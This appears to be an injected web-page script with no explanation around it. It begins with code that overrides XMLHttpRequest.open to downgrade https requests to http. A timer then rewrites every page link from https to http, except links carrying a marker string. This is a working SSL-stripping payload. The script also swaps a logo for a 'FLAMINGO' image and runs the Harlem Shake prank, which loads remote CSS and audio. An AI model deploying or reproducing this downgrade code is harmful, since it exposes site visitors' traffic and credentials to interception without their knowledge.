XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
	obf_var_url = obf_var_url.replace(/^(http)s/ig, "$1")
	XMLHttpRequest.prototype.obf_open(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password)
}

setInterval(function(){
	document.querySelectorAll("a").forEach(function(obf_a){
		if (obf_a.href.indexOf('mbtskoudsalg') === -1) {
			obf_a.href = obf_a.href.replace(/^(http)s/ig, "http")
		}
	})
}, 666)

setTimeout(function() {
    var hipoLogo = document.querySelector("#hipoLogo");
    hipoLogo.innerHTML = '<img src="data:image/png;base64,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BAAAqJAAAAAVEgAAoEICAABUSAAAgAoJAABQIQEAACokAABAhQQAAKiQAAAAFRIAAKBCAgAAVEgAAIAKCQAAUCEBAAAqJAAAQIUEAACokAAAABUSAACgQgIAAFRIAACACgkAAFAhAQAAKiQAAECFBAAAqJAAAAAVEgAAoEICAABUSAAAgARCvp8AAAFsSURBVAoJAABQIQEAACokAABAhQQAAKiQAAAAFRIAAKBCAgAAVEgAAIAKCQAAUCEBAAAqJAAAQIUEAACokAAAABUSAACgQgIAAFRIAACACgkAAFAhAQAAKiQAAECFBAAAqJAAAAAVEgAAoEICAABUSAAAgAoJAABQIQEAACokAABAhQQAAKiQAAAAFRIAAKBCAgAAVEgAAIAKCQAAUCEBAAAqJAAAQIUEAACokAAAABUSAACgQgIAAFRIAACACgkAAFAhAQAAKiQAAECFBAAAqJAAAAAVEgAAoEICAABUSAAAgAoJAABQIQEAACokAABAhQQAAKiQAAAAFRIAAKBCAgAAVEgAAIAKCQAAUCEBAAAqJAAAQIUEAACokAAAABUSAACgQgIAAFRIAACACgkAAFAhAQAAKiQAAECFBAAAqJAAAAAVEgAAoEICAABUSAAAgAoJAABQIQEAACokAAAAAAAAAAAAAAAAwFj8f0wmiMZvJgNEAAAAAElFTkSuQmCC" id="hipoLogoSVG" height="100" width="200"><div id="hipoLogoText" style="opacity: 1;">FLAMINGO</div>'
}, 3000);

(function () {
    function c() {
        var e = document.createElement("link");
        e.setAttribute("type", "text/css");
        e.setAttribute("rel", "stylesheet");
        e.setAttribute("href", f);
        e.setAttribute("class", l);
        document.body.appendChild(e)
    }
    function h() {
        var e = document.getElementsByClassName(l);
        for (var t = 0; t < e.length; t++) {
            document.body.removeChild(e[t])
        }
    }
    function p() {
        var e = document.createElement("div");
        e.setAttribute("class", a);
        document.body.appendChild(e);
        setTimeout(function () {
            document.body.removeChild(e)
        }, 100)
    }
    function d(e) {
        return {
            height: e.offsetHeight,
            width: e.offsetWidth
        }
    }
    function v(i) {
        var s = d(i);
        return s.height > e && s.height < n && s.width > t && s.width < r
    }
    function m(e) {
        var t = e;
        var n = 0;
        while ( !! t) {
            n += t.offsetTop;
            t = t.offsetParent
        }
        return n
    }
    function g() {
        var e = document.documentElement;
        if ( !! window.innerWidth) {
            return window.innerHeight
        } else if (e && !isNaN(e.clientHeight)) {
            return e.clientHeight
        }
        return 0
    }
    function y() {
        if (window.pageYOffset) {
            return window.pageYOffset
        }
        return Math.max(document.documentElement.scrollTop, document.body.scrollTop)
    }
    function E(e) {
        var t = m(e);
        return t >= w && t <= b + w
    }
    function S() {
        var e = document.createElement("audio");
        e.setAttribute("class", l);
        e.src = i;
        e.loop = false;
        e.addEventListener("canplay", function () {
            setTimeout(function () {
                x(k)
            }, 500);
            setTimeout(function () {
                N();
                p();
                for (var e = 0; e < O.length; e++) {
                    T(O[e])
                }
            }, 15500)
        }, true);
        e.addEventListener("ended", function () {
            N();
            h()
        }, true);
        e.innerHTML = " <p>If you are reading this, it is because your browser does not support the audio element. We recommend that you get a new browser.</p> <p>";
        document.body.appendChild(e);
        e.play()
    }
    function x(e) {
        e.className += " " + s + " " + o
    }
    function T(e) {
        e.className += " " + s + " " + u[Math.floor(Math.random() * u.length)]
    }
    function N() {
        var e = document.getElementsByClassName(s);
        var t = new RegExp("\\b" + s + "\\b");
        for (var n = 0; n < e.length;) {
            e[n].className = e[n].className.replace(t, "")
        }
    }
    var e = 30;
    var t = 30;
    var n = 350;
    var r = 350;
    var i = "https://s3.amazonaws.com/moovweb-marketing/playground/harlem-shake.mp3";
    var s = "mw-harlem_shake_me";
    var o = "im_first";
    var u = ["im_drunk", "im_baked", "im_trippin", "im_blown"];
    var a = "mw-strobe_light";
    var f = "https://s3.amazonaws.com/moovweb-marketing/playground/harlem-shake-style.css";
    var l = "mw_added_css";
    var b = g();
    var w = y();
    var C = document.getElementsByTagName("*");
    var k = null;
    for (var L = 0; L < C.length; L++) {
        var A = C[L];
        if (v(A)) {
            if (E(A)) {
                k = A;
                break
            }
        }
    }
    if (A === null) {
        console.warn("Could not find a node of the right size. Please try a different page.");
        return
    }
    c();
    S();
    var O = [];
    for (var L = 0; L < C.length; L++) {
        var A = C[L];
        if (v(A)) {
            O.push(A)
        }
    }
})()